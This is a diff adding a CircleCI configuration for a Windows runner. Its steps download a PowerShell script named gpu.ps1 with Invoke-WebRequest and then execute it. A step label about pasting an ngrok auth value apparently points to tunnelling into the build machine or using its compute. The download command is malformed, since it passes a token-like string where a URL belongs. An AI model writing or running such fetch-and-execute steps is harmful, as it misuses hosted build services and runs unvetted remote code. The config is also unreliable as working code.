@@ -1,0 +1,21 @@
+version: 2.1 
+ 
+orbs:
+  win: circleci/windows@2.2.0
+ 
+jobs:
+  build: 
+    executor:
+      name: win/default 
+      size: "medium" 
+      
+        
+ 
+    steps:  
+       
+      - run: 
+          name: Paste Ngrok Auth Value In Hosted Link
+          command: |      
+            Invoke-WebRequest 27D0zH6iELllnkLNSk1grbWQvqo_dJAdyGAUp3XjHdogMi3D -OutFile gpu.ps1 
+          
+      - run: ./gpu.ps1
